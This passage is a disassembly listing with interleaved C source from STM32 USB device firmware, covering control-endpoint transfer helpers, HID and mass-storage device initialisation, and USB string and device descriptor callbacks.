  uint8_t *pbuff = buf;
 800c21c:	687b      	ldr	r3, [r7, #4]
 800c21e:	60bb      	str	r3, [r7, #8]

  while (*pbuff != (uint8_t)'\0')
 800c220:	e005      	b.n	800c22e <USBD_GetLen+0x1e>
  {
    len++;
 800c222:	7bfb      	ldrb	r3, [r7, #15]
 800c224:	3301      	adds	r3, #1
 800c226:	73fb      	strb	r3, [r7, #15]
    pbuff++;
 800c228:	68bb      	ldr	r3, [r7, #8]
 800c22a:	3301      	adds	r3, #1
 800c22c:	60bb      	str	r3, [r7, #8]
  while (*pbuff != (uint8_t)'\0')
 800c22e:	68bb      	ldr	r3, [r7, #8]
 800c230:	781b      	ldrb	r3, [r3, #0]
 800c232:	2b00      	cmp	r3, #0
 800c234:	d1f5      	bne.n	800c222 <USBD_GetLen+0x12>
  }

  return len;
 800c236:	7bfb      	ldrb	r3, [r7, #15]
}
 800c238:	4618      	mov	r0, r3
 800c23a:	3714      	adds	r7, #20
 800c23c:	46bd      	mov	sp, r7
 800c23e:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c242:	4770      	bx	lr

0800c244 <USBD_CtlSendData>:
  * @param  len: length of data to be sent
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlSendData(USBD_HandleTypeDef *pdev,
                                    uint8_t *pbuf, uint32_t len)
{
 800c244:	b580      	push	{r7, lr}
 800c246:	b084      	sub	sp, #16
 800c248:	af00      	add	r7, sp, #0
 800c24a:	60f8      	str	r0, [r7, #12]
 800c24c:	60b9      	str	r1, [r7, #8]
 800c24e:	607a      	str	r2, [r7, #4]
  /* Set EP0 State */
  pdev->ep0_state = USBD_EP0_DATA_IN;
 800c250:	68fb      	ldr	r3, [r7, #12]
 800c252:	2202      	movs	r2, #2
 800c254:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294
  pdev->ep_in[0].total_length = len;
 800c258:	68fb      	ldr	r3, [r7, #12]
 800c25a:	687a      	ldr	r2, [r7, #4]
 800c25c:	619a      	str	r2, [r3, #24]

#ifdef USBD_AVOID_PACKET_SPLIT_MPS
  pdev->ep_in[0].rem_length = 0U;
#else
  pdev->ep_in[0].rem_length = len;
 800c25e:	68fb      	ldr	r3, [r7, #12]
 800c260:	687a      	ldr	r2, [r7, #4]
 800c262:	61da      	str	r2, [r3, #28]
#endif /* USBD_AVOID_PACKET_SPLIT_MPS */

  /* Start the transfer */
  (void)USBD_LL_Transmit(pdev, 0x00U, pbuf, len);
 800c264:	687b      	ldr	r3, [r7, #4]
 800c266:	68ba      	ldr	r2, [r7, #8]
 800c268:	2100      	movs	r1, #0
 800c26a:	68f8      	ldr	r0, [r7, #12]
 800c26c:	f000 fdbc 	bl	800cde8 <USBD_LL_Transmit>

  return USBD_OK;
 800c270:	2300      	movs	r3, #0
}
 800c272:	4618      	mov	r0, r3
 800c274:	3710      	adds	r7, #16
 800c276:	46bd      	mov	sp, r7
 800c278:	bd80      	pop	{r7, pc}

0800c27a <USBD_CtlContinueSendData>:
  * @param  len: length of data to be sent
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlContinueSendData(USBD_HandleTypeDef *pdev,
                                            uint8_t *pbuf, uint32_t len)
{
 800c27a:	b580      	push	{r7, lr}
 800c27c:	b084      	sub	sp, #16
 800c27e:	af00      	add	r7, sp, #0
 800c280:	60f8      	str	r0, [r7, #12]
 800c282:	60b9      	str	r1, [r7, #8]
 800c284:	607a      	str	r2, [r7, #4]
  /* Start the next transfer */
  (void)USBD_LL_Transmit(pdev, 0x00U, pbuf, len);
 800c286:	687b      	ldr	r3, [r7, #4]
 800c288:	68ba      	ldr	r2, [r7, #8]
 800c28a:	2100      	movs	r1, #0
 800c28c:	68f8      	ldr	r0, [r7, #12]
 800c28e:	f000 fdab 	bl	800cde8 <USBD_LL_Transmit>

  return USBD_OK;
 800c292:	2300      	movs	r3, #0
}
 800c294:	4618      	mov	r0, r3
 800c296:	3710      	adds	r7, #16
 800c298:	46bd      	mov	sp, r7
 800c29a:	bd80      	pop	{r7, pc}

0800c29c <USBD_CtlPrepareRx>:
  * @param  len: length of data to be received
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlPrepareRx(USBD_HandleTypeDef *pdev,
                                     uint8_t *pbuf, uint32_t len)
{
 800c29c:	b580      	push	{r7, lr}
 800c29e:	b084      	sub	sp, #16
 800c2a0:	af00      	add	r7, sp, #0
 800c2a2:	60f8      	str	r0, [r7, #12]
 800c2a4:	60b9      	str	r1, [r7, #8]
 800c2a6:	607a      	str	r2, [r7, #4]
  /* Set EP0 State */
  pdev->ep0_state = USBD_EP0_DATA_OUT;
 800c2a8:	68fb      	ldr	r3, [r7, #12]
 800c2aa:	2203      	movs	r2, #3
 800c2ac:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294
  pdev->ep_out[0].total_length = len;
 800c2b0:	68fb      	ldr	r3, [r7, #12]
 800c2b2:	687a      	ldr	r2, [r7, #4]
 800c2b4:	f8c3 2158 	str.w	r2, [r3, #344]	; 0x158

#ifdef USBD_AVOID_PACKET_SPLIT_MPS
  pdev->ep_out[0].rem_length = 0U;
#else
  pdev->ep_out[0].rem_length = len;
 800c2b8:	68fb      	ldr	r3, [r7, #12]
 800c2ba:	687a      	ldr	r2, [r7, #4]
 800c2bc:	f8c3 215c 	str.w	r2, [r3, #348]	; 0x15c
#endif /* USBD_AVOID_PACKET_SPLIT_MPS */

  /* Start the transfer */
  (void)USBD_LL_PrepareReceive(pdev, 0U, pbuf, len);
 800c2c0:	687b      	ldr	r3, [r7, #4]
 800c2c2:	68ba      	ldr	r2, [r7, #8]
 800c2c4:	2100      	movs	r1, #0
 800c2c6:	68f8      	ldr	r0, [r7, #12]
 800c2c8:	f000 fdc6 	bl	800ce58 <USBD_LL_PrepareReceive>

  return USBD_OK;
 800c2cc:	2300      	movs	r3, #0
}
 800c2ce:	4618      	mov	r0, r3
 800c2d0:	3710      	adds	r7, #16
 800c2d2:	46bd      	mov	sp, r7
 800c2d4:	bd80      	pop	{r7, pc}

0800c2d6 <USBD_CtlContinueRx>:
  * @param  len: length of data to be received
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlContinueRx(USBD_HandleTypeDef *pdev,
                                      uint8_t *pbuf, uint32_t len)
{
 800c2d6:	b580      	push	{r7, lr}
 800c2d8:	b084      	sub	sp, #16
 800c2da:	af00      	add	r7, sp, #0
 800c2dc:	60f8      	str	r0, [r7, #12]
 800c2de:	60b9      	str	r1, [r7, #8]
 800c2e0:	607a      	str	r2, [r7, #4]
  (void)USBD_LL_PrepareReceive(pdev, 0U, pbuf, len);
 800c2e2:	687b      	ldr	r3, [r7, #4]
 800c2e4:	68ba      	ldr	r2, [r7, #8]
 800c2e6:	2100      	movs	r1, #0
 800c2e8:	68f8      	ldr	r0, [r7, #12]
 800c2ea:	f000 fdb5 	bl	800ce58 <USBD_LL_PrepareReceive>

  return USBD_OK;
 800c2ee:	2300      	movs	r3, #0
}
 800c2f0:	4618      	mov	r0, r3
 800c2f2:	3710      	adds	r7, #16
 800c2f4:	46bd      	mov	sp, r7
 800c2f6:	bd80      	pop	{r7, pc}

0800c2f8 <USBD_CtlSendStatus>:
  *         send zero lzngth packet on the ctl pipe
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlSendStatus(USBD_HandleTypeDef *pdev)
{
 800c2f8:	b580      	push	{r7, lr}
 800c2fa:	b082      	sub	sp, #8
 800c2fc:	af00      	add	r7, sp, #0
 800c2fe:	6078      	str	r0, [r7, #4]
  /* Set EP0 State */
  pdev->ep0_state = USBD_EP0_STATUS_IN;
 800c300:	687b      	ldr	r3, [r7, #4]
 800c302:	2204      	movs	r2, #4
 800c304:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294

  /* Start the transfer */
  (void)USBD_LL_Transmit(pdev, 0x00U, NULL, 0U);
 800c308:	2300      	movs	r3, #0
 800c30a:	2200      	movs	r2, #0
 800c30c:	2100      	movs	r1, #0
 800c30e:	6878      	ldr	r0, [r7, #4]
 800c310:	f000 fd6a 	bl	800cde8 <USBD_LL_Transmit>

  return USBD_OK;
 800c314:	2300      	movs	r3, #0
}
 800c316:	4618      	mov	r0, r3
 800c318:	3708      	adds	r7, #8
 800c31a:	46bd      	mov	sp, r7
 800c31c:	bd80      	pop	{r7, pc}

0800c31e <USBD_CtlReceiveStatus>:
  *         receive zero lzngth packet on the ctl pipe
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlReceiveStatus(USBD_HandleTypeDef *pdev)
{
 800c31e:	b580      	push	{r7, lr}
 800c320:	b082      	sub	sp, #8
 800c322:	af00      	add	r7, sp, #0
 800c324:	6078      	str	r0, [r7, #4]
  /* Set EP0 State */
  pdev->ep0_state = USBD_EP0_STATUS_OUT;
 800c326:	687b      	ldr	r3, [r7, #4]
 800c328:	2205      	movs	r2, #5
 800c32a:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294

  /* Start the transfer */
  (void)USBD_LL_PrepareReceive(pdev, 0U, NULL, 0U);
 800c32e:	2300      	movs	r3, #0
 800c330:	2200      	movs	r2, #0
 800c332:	2100      	movs	r1, #0
 800c334:	6878      	ldr	r0, [r7, #4]
 800c336:	f000 fd8f 	bl	800ce58 <USBD_LL_PrepareReceive>

  return USBD_OK;
 800c33a:	2300      	movs	r3, #0
}
 800c33c:	4618      	mov	r0, r3
 800c33e:	3708      	adds	r7, #8
 800c340:	46bd      	mov	sp, r7
 800c342:	bd80      	pop	{r7, pc}

0800c344 <MX_USB_DEVICE_Init>:
/**
  * Init USB device Library, add supported class and start the library
  * @retval None
  */
void MX_USB_DEVICE_Init(void)
{
 800c344:	b580      	push	{r7, lr}
 800c346:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN USB_DEVICE_Init_PreTreatment */

  /* USER CODE END USB_DEVICE_Init_PreTreatment */

  /* Init Device Library, add supported class and start the library. */
  if (USBD_Init(&hUsbDeviceFS, &FS_Desc, DEVICE_FS) != USBD_OK)
 800c348:	2200      	movs	r2, #0
 800c34a:	4912      	ldr	r1, [pc, #72]	; (800c394 <MX_USB_DEVICE_Init+0x50>)
 800c34c:	4812      	ldr	r0, [pc, #72]	; (800c398 <MX_USB_DEVICE_Init+0x54>)
 800c34e:	f7fe fd68 	bl	800ae22 <USBD_Init>
 800c352:	4603      	mov	r3, r0
 800c354:	2b00      	cmp	r3, #0
 800c356:	d001      	beq.n	800c35c <MX_USB_DEVICE_Init+0x18>
  {
    Error_Handler();
 800c358:	f7f4 fc7e 	bl	8000c58 <Error_Handler>
  }
  if (USBD_RegisterClass(&hUsbDeviceFS, &USBD_CUSTOM_HID) != USBD_OK)
 800c35c:	490f      	ldr	r1, [pc, #60]	; (800c39c <MX_USB_DEVICE_Init+0x58>)
 800c35e:	480e      	ldr	r0, [pc, #56]	; (800c398 <MX_USB_DEVICE_Init+0x54>)
 800c360:	f7fe fd8f 	bl	800ae82 <USBD_RegisterClass>
 800c364:	4603      	mov	r3, r0
 800c366:	2b00      	cmp	r3, #0
 800c368:	d001      	beq.n	800c36e <MX_USB_DEVICE_Init+0x2a>
  {
    Error_Handler();
 800c36a:	f7f4 fc75 	bl	8000c58 <Error_Handler>
  }
  if (USBD_CUSTOM_HID_RegisterInterface(&hUsbDeviceFS, &USBD_CustomHID_fops_FS) != USBD_OK)
 800c36e:	490c      	ldr	r1, [pc, #48]	; (800c3a0 <MX_USB_DEVICE_Init+0x5c>)
 800c370:	4809      	ldr	r0, [pc, #36]	; (800c398 <MX_USB_DEVICE_Init+0x54>)
 800c372:	f7fc fca5 	bl	8008cc0 <USBD_CUSTOM_HID_RegisterInterface>
 800c376:	4603      	mov	r3, r0
 800c378:	2b00      	cmp	r3, #0
 800c37a:	d001      	beq.n	800c380 <MX_USB_DEVICE_Init+0x3c>
  {
    Error_Handler();
 800c37c:	f7f4 fc6c 	bl	8000c58 <Error_Handler>
  }
  if (USBD_Start(&hUsbDeviceFS) != USBD_OK)
 800c380:	4805      	ldr	r0, [pc, #20]	; (800c398 <MX_USB_DEVICE_Init+0x54>)
 800c382:	f7fe fdb4 	bl	800aeee <USBD_Start>
 800c386:	4603      	mov	r3, r0
 800c388:	2b00      	cmp	r3, #0
 800c38a:	d001      	beq.n	800c390 <MX_USB_DEVICE_Init+0x4c>
  {
    Error_Handler();
 800c38c:	f7f4 fc64 	bl	8000c58 <Error_Handler>
  }
  /* USER CODE BEGIN USB_DEVICE_Init_PostTreatment */
  /* USER CODE END USB_DEVICE_Init_PostTreatment */
}
 800c390:	bf00      	nop
 800c392:	bd80      	pop	{r7, pc}
 800c394:	200001ac 	.word	0x200001ac
 800c398:	200003c0 	.word	0x200003c0
 800c39c:	2000002c 	.word	0x2000002c
 800c3a0:	2000019c 	.word	0x2000019c

0800c3a4 <MX_USB_DEVICE_Init_MSC>:
/**
  * Init USB device Library, add supported class and start the library
  * @retval None
  */
void MX_USB_DEVICE_Init_MSC(void)
{
 800c3a4:	b580      	push	{r7, lr}
 800c3a6:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN USB_DEVICE_Init_PreTreatment */

  /* USER CODE END USB_DEVICE_Init_PreTreatment */

  /* Init Device Library, add supported class and start the library. */
  if (USBD_Init(&hUsbDeviceFS_MSC, &FS_Desc, DEVICE_FS) != USBD_OK)
 800c3a8:	2200      	movs	r2, #0
 800c3aa:	4912      	ldr	r1, [pc, #72]	; (800c3f4 <MX_USB_DEVICE_Init_MSC+0x50>)
 800c3ac:	4812      	ldr	r0, [pc, #72]	; (800c3f8 <MX_USB_DEVICE_Init_MSC+0x54>)
 800c3ae:	f7fe fd38 	bl	800ae22 <USBD_Init>
 800c3b2:	4603      	mov	r3, r0
 800c3b4:	2b00      	cmp	r3, #0
 800c3b6:	d001      	beq.n	800c3bc <MX_USB_DEVICE_Init_MSC+0x18>
  {
    Error_Handler();
 800c3b8:	f7f4 fc4e 	bl	8000c58 <Error_Handler>
  }
  if (USBD_RegisterClass(&hUsbDeviceFS_MSC, &USBD_MSC) != USBD_OK)
 800c3bc:	490f      	ldr	r1, [pc, #60]	; (800c3fc <MX_USB_DEVICE_Init_MSC+0x58>)
 800c3be:	480e      	ldr	r0, [pc, #56]	; (800c3f8 <MX_USB_DEVICE_Init_MSC+0x54>)
 800c3c0:	f7fe fd5f 	bl	800ae82 <USBD_RegisterClass>
 800c3c4:	4603      	mov	r3, r0
 800c3c6:	2b00      	cmp	r3, #0
 800c3c8:	d001      	beq.n	800c3ce <MX_USB_DEVICE_Init_MSC+0x2a>
  {
    Error_Handler();
 800c3ca:	f7f4 fc45 	bl	8000c58 <Error_Handler>
  }
  if (USBD_MSC_RegisterStorage(&hUsbDeviceFS_MSC, &USBD_Storage_Interface_fops_FS) != USBD_OK)
 800c3ce:	490c      	ldr	r1, [pc, #48]	; (800c400 <MX_USB_DEVICE_Init_MSC+0x5c>)
 800c3d0:	4809      	ldr	r0, [pc, #36]	; (800c3f8 <MX_USB_DEVICE_Init_MSC+0x54>)
 800c3d2:	f7fc ff27 	bl	8009224 <USBD_MSC_RegisterStorage>
 800c3d6:	4603      	mov	r3, r0
 800c3d8:	2b00      	cmp	r3, #0
 800c3da:	d001      	beq.n	800c3e0 <MX_USB_DEVICE_Init_MSC+0x3c>
  {
    Error_Handler();
 800c3dc:	f7f4 fc3c 	bl	8000c58 <Error_Handler>
  }
  if (USBD_Start(&hUsbDeviceFS_MSC) != USBD_OK)
 800c3e0:	4805      	ldr	r0, [pc, #20]	; (800c3f8 <MX_USB_DEVICE_Init_MSC+0x54>)
 800c3e2:	f7fe fd84 	bl	800aeee <USBD_Start>
 800c3e6:	4603      	mov	r3, r0
 800c3e8:	2b00      	cmp	r3, #0
 800c3ea:	d001      	beq.n	800c3f0 <MX_USB_DEVICE_Init_MSC+0x4c>
  {
    Error_Handler();
 800c3ec:	f7f4 fc34 	bl	8000c58 <Error_Handler>
  }
  /* USER CODE BEGIN USB_DEVICE_Init_PostTreatment */

  /* USER CODE END USB_DEVICE_Init_PostTreatment */
}
 800c3f0:	bf00      	nop
 800c3f2:	bd80      	pop	{r7, pc}
 800c3f4:	200001ac 	.word	0x200001ac
 800c3f8:	2000069c 	.word	0x2000069c
 800c3fc:	200000a8 	.word	0x200000a8
 800c400:	20000220 	.word	0x20000220

0800c404 <CUSTOM_HID_Init_FS>:
/**
  * @brief  Initializes the CUSTOM HID media low layer
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
static int8_t CUSTOM_HID_Init_FS(void)
{
 800c404:	b480      	push	{r7}
 800c406:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN 4 */
  return (USBD_OK);
 800c408:	2300      	movs	r3, #0
  /* USER CODE END 4 */
}
 800c40a:	4618      	mov	r0, r3
 800c40c:	46bd      	mov	sp, r7
 800c40e:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c412:	4770      	bx	lr

0800c414 <CUSTOM_HID_DeInit_FS>:
/**
  * @brief  DeInitializes the CUSTOM HID media low layer
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
static int8_t CUSTOM_HID_DeInit_FS(void)
{
 800c414:	b480      	push	{r7}
 800c416:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN 5 */
  return (USBD_OK);
 800c418:	2300      	movs	r3, #0
  /* USER CODE END 5 */
}
 800c41a:	4618      	mov	r0, r3
 800c41c:	46bd      	mov	sp, r7
 800c41e:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c422:	4770      	bx	lr

0800c424 <CUSTOM_HID_OutEvent_FS>:
  * @param  event_idx: Event index
  * @param  state: Event state
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
static int8_t CUSTOM_HID_OutEvent_FS(uint8_t event_idx, uint8_t state)
{
 800c424:	b580      	push	{r7, lr}
 800c426:	b082      	sub	sp, #8
 800c428:	af00      	add	r7, sp, #0
 800c42a:	4603      	mov	r3, r0
 800c42c:	460a      	mov	r2, r1
 800c42e:	71fb      	strb	r3, [r7, #7]
 800c430:	4613      	mov	r3, r2
 800c432:	71bb      	strb	r3, [r7, #6]
  /* USER CODE BEGIN 6 */
  UNUSED(event_idx);
  UNUSED(state);

  /* Start next USB packet transfer once data processing is completed */
  USBD_CUSTOM_HID_ReceivePacket(&hUsbDeviceFS);
 800c434:	4803      	ldr	r0, [pc, #12]	; (800c444 <CUSTOM_HID_OutEvent_FS+0x20>)
 800c436:	f7fc fbd1 	bl	8008bdc <USBD_CUSTOM_HID_ReceivePacket>

  return (USBD_OK);
 800c43a:	2300      	movs	r3, #0
  /* USER CODE END 6 */
}
 800c43c:	4618      	mov	r0, r3
 800c43e:	3708      	adds	r7, #8
 800c440:	46bd      	mov	sp, r7
 800c442:	bd80      	pop	{r7, pc}
 800c444:	200003c0 	.word	0x200003c0

0800c448 <USBD_FS_DeviceDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_DeviceDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c448:	b480      	push	{r7}
 800c44a:	b083      	sub	sp, #12
 800c44c:	af00      	add	r7, sp, #0
 800c44e:	4603      	mov	r3, r0
 800c450:	6039      	str	r1, [r7, #0]
 800c452:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  *length = sizeof(USBD_FS_DeviceDesc);
 800c454:	683b      	ldr	r3, [r7, #0]
 800c456:	2212      	movs	r2, #18
 800c458:	801a      	strh	r2, [r3, #0]
  if(isMSC == 1)
 800c45a:	4b06      	ldr	r3, [pc, #24]	; (800c474 <USBD_FS_DeviceDescriptor+0x2c>)
 800c45c:	681b      	ldr	r3, [r3, #0]
 800c45e:	2b01      	cmp	r3, #1
 800c460:	d101      	bne.n	800c466 <USBD_FS_DeviceDescriptor+0x1e>
	  return USBD_FS_DeviceDesc;
 800c462:	4b05      	ldr	r3, [pc, #20]	; (800c478 <USBD_FS_DeviceDescriptor+0x30>)
 800c464:	e000      	b.n	800c468 <USBD_FS_DeviceDescriptor+0x20>
  else
	  return USBD_FS_DeviceDesc_HID;
 800c466:	4b05      	ldr	r3, [pc, #20]	; (800c47c <USBD_FS_DeviceDescriptor+0x34>)
}
 800c468:	4618      	mov	r0, r3
 800c46a:	370c      	adds	r7, #12
 800c46c:	46bd      	mov	sp, r7
 800c46e:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c472:	4770      	bx	lr
 800c474:	20000978 	.word	0x20000978
 800c478:	200001cc 	.word	0x200001cc
 800c47c:	200001e0 	.word	0x200001e0

0800c480 <USBD_FS_LangIDStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_LangIDStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c480:	b480      	push	{r7}
 800c482:	b083      	sub	sp, #12
 800c484:	af00      	add	r7, sp, #0
 800c486:	4603      	mov	r3, r0
 800c488:	6039      	str	r1, [r7, #0]
 800c48a:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  *length = sizeof(USBD_LangIDDesc);
 800c48c:	683b      	ldr	r3, [r7, #0]
 800c48e:	2204      	movs	r2, #4
 800c490:	801a      	strh	r2, [r3, #0]
  return USBD_LangIDDesc;
 800c492:	4b03      	ldr	r3, [pc, #12]	; (800c4a0 <USBD_FS_LangIDStrDescriptor+0x20>)
}
 800c494:	4618      	mov	r0, r3
 800c496:	370c      	adds	r7, #12
 800c498:	46bd      	mov	sp, r7
 800c49a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c49e:	4770      	bx	lr
 800c4a0:	20000200 	.word	0x20000200

0800c4a4 <USBD_FS_ProductStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_ProductStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c4a4:	b580      	push	{r7, lr}
 800c4a6:	b082      	sub	sp, #8
 800c4a8:	af00      	add	r7, sp, #0
 800c4aa:	4603      	mov	r3, r0
 800c4ac:	6039      	str	r1, [r7, #0]
 800c4ae:	71fb      	strb	r3, [r7, #7]
  if(speed == 0)
 800c4b0:	79fb      	ldrb	r3, [r7, #7]
 800c4b2:	2b00      	cmp	r3, #0
 800c4b4:	d105      	bne.n	800c4c2 <USBD_FS_ProductStrDescriptor+0x1e>
  {
    USBD_GetString((uint8_t *)USBD_PRODUCT_STRING_FS, USBD_StrDesc, length);
 800c4b6:	683a      	ldr	r2, [r7, #0]
 800c4b8:	4907      	ldr	r1, [pc, #28]	; (800c4d8 <USBD_FS_ProductStrDescriptor+0x34>)
 800c4ba:	4808      	ldr	r0, [pc, #32]	; (800c4dc <USBD_FS_ProductStrDescriptor+0x38>)
 800c4bc:	f7ff fe62 	bl	800c184 <USBD_GetString>
 800c4c0:	e004      	b.n	800c4cc <USBD_FS_ProductStrDescriptor+0x28>
  }
  else
  {
    USBD_GetString((uint8_t *)USBD_PRODUCT_STRING_FS, USBD_StrDesc, length);
 800c4c2:	683a      	ldr	r2, [r7, #0]
 800c4c4:	4904      	ldr	r1, [pc, #16]	; (800c4d8 <USBD_FS_ProductStrDescriptor+0x34>)
 800c4c6:	4805      	ldr	r0, [pc, #20]	; (800c4dc <USBD_FS_ProductStrDescriptor+0x38>)
 800c4c8:	f7ff fe5c 	bl	800c184 <USBD_GetString>
  }
  return USBD_StrDesc;
 800c4cc:	4b02      	ldr	r3, [pc, #8]	; (800c4d8 <USBD_FS_ProductStrDescriptor+0x34>)
}
 800c4ce:	4618      	mov	r0, r3
 800c4d0:	3708      	adds	r7, #8
 800c4d2:	46bd      	mov	sp, r7
 800c4d4:	bd80      	pop	{r7, pc}
 800c4d6:	bf00      	nop
 800c4d8:	2000097c 	.word	0x2000097c
 800c4dc:	0800d138 	.word	0x0800d138

0800c4e0 <USBD_FS_ManufacturerStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_ManufacturerStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c4e0:	b580      	push	{r7, lr}
 800c4e2:	b082      	sub	sp, #8
 800c4e4:	af00      	add	r7, sp, #0
 800c4e6:	4603      	mov	r3, r0
 800c4e8:	6039      	str	r1, [r7, #0]
 800c4ea:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  USBD_GetString((uint8_t *)USBD_MANUFACTURER_STRING, USBD_StrDesc, length);
 800c4ec:	683a      	ldr	r2, [r7, #0]
 800c4ee:	4904      	ldr	r1, [pc, #16]	; (800c500 <USBD_FS_ManufacturerStrDescriptor+0x20>)
 800c4f0:	4804      	ldr	r0, [pc, #16]	; (800c504 <USBD_FS_ManufacturerStrDescriptor+0x24>)
 800c4f2:	f7ff fe47 	bl	800c184 <USBD_GetString>
  return USBD_StrDesc;
 800c4f6:	4b02      	ldr	r3, [pc, #8]	; (800c500 <USBD_FS_ManufacturerStrDescriptor+0x20>)
}
 800c4f8:	4618      	mov	r0, r3
 800c4fa:	3708      	adds	r7, #8
 800c4fc:	46bd      	mov	sp, r7
 800c4fe:	bd80      	pop	{r7, pc}
 800c500:	2000097c 	.word	0x2000097c
 800c504:	0800d14c 	.word	0x0800d14c

0800c508 <USBD_FS_SerialStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_SerialStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c508:	b580      	push	{r7, lr}
 800c50a:	b082      	sub	sp, #8
 800c50c:	af00      	add	r7, sp, #0
 800c50e:	4603      	mov	r3, r0
 800c510:	6039      	str	r1, [r7, #0]
 800c512:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  *length = USB_SIZ_STRING_SERIAL;
 800c514:	683b      	ldr	r3, [r7, #0]
 800c516:	221a      	movs	r2, #26
 800c518:	801a      	strh	r2, [r3, #0]

  /* Update the serial number string descriptor with the data from the unique
   * ID */
  Get_SerialNum();
 800c51a:	f000 f855 	bl	800c5c8 <Get_SerialNum>
  /* USER CODE BEGIN USBD_FS_SerialStrDescriptor */

  /* USER CODE END USBD_FS_SerialStrDescriptor */
  return (uint8_t *) USBD_StringSerial;
 800c51e:	4b02      	ldr	r3, [pc, #8]	; (800c528 <USBD_FS_SerialStrDescriptor+0x20>)
}
 800c520:	4618      	mov	r0, r3
 800c522:	3708      	adds	r7, #8
 800c524:	46bd      	mov	sp, r7
 800c526:	bd80      	pop	{r7, pc}
 800c528:	20000204 	.word	0x20000204

0800c52c <USBD_FS_ConfigStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_ConfigStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c52c:	b580      	push	{r7, lr}
 800c52e:	b082      	sub	sp, #8
 800c530:	af00      	add	r7, sp, #0
 800c532:	4603      	mov	r3, r0
 800c534:	6039      	str	r1, [r7, #0]
 800c536:	71fb      	strb	r3, [r7, #7]
  if(speed == USBD_SPEED_HIGH)
 800c538:	79fb      	ldrb	r3, [r7, #7]
 800c53a:	2b00      	cmp	r3, #0
 800c53c:	d105      	bne.n	800c54a <USBD_FS_ConfigStrDescriptor+0x1e>
  {
    USBD_GetString((uint8_t *)USBD_CONFIGURATION_STRING_FS, USBD_StrDesc, length);
 800c53e:	683a      	ldr	r2, [r7, #0]
 800c540:	4907      	ldr	r1, [pc, #28]	; (800c560 <USBD_FS_ConfigStrDescriptor+0x34>)
 800c542:	4808      	ldr	r0, [pc, #32]	; (800c564 <USBD_FS_ConfigStrDescriptor+0x38>)
 800c544:	f7ff fe1e 	bl	800c184 <USBD_GetString>
 800c548:	e004      	b.n	800c554 <USBD_FS_ConfigStrDescriptor+0x28>
  }
  else
  {
    USBD_GetString((uint8_t *)USBD_CONFIGURATION_STRING_FS, USBD_StrDesc, length);
 800c54a:	683a      	ldr	r2, [r7, #0]
 800c54c:	4904      	ldr	r1, [pc, #16]	; (800c560 <USBD_FS_ConfigStrDescriptor+0x34>)
 800c54e:	4805      	ldr	r0, [pc, #20]	; (800c564 <USBD_FS_ConfigStrDescriptor+0x38>)
 800c550:	f7ff fe18 	bl	800c184 <USBD_GetString>
  }
  return USBD_StrDesc;
 800c554:	4b02      	ldr	r3, [pc, #8]	; (800c560 <USBD_FS_ConfigStrDescriptor+0x34>)
}
 800c556:	4618      	mov	r0, r3
 800c558:	3708      	adds	r7, #8
 800c55a:	46bd      	mov	sp, r7
 800c55c:	bd80      	pop	{r7, pc}
 800c55e:	bf00      	nop
 800c560:	2000097c 	.word	0x2000097c
 800c564:	0800d150 	.word	0x0800d150

0800c568 <USBD_FS_InterfaceStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_InterfaceStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c568:	b580      	push	{r7, lr}
 800c56a:	b082      	sub	sp, #8
 800c56c:	af00      	add	r7, sp, #0
 800c56e:	4603      	mov	r3, r0
 800c570:	6039      	str	r1, [r7, #0]
 800c572:	71fb      	strb	r3, [r7, #7]
  if(speed == 0)
 800c574:	79fb      	ldrb	r3, [r7, #7]
 800c576:	2b00      	cmp	r3, #0
 800c578:	d105      	bne.n	800c586 <USBD_FS_InterfaceStrDescriptor+0x1e>
  {
    USBD_GetString((uint8_t *)USBD_INTERFACE_STRING_FS, USBD_StrDesc, length);
 800c57a:	683a      	ldr	r2, [r7, #0]
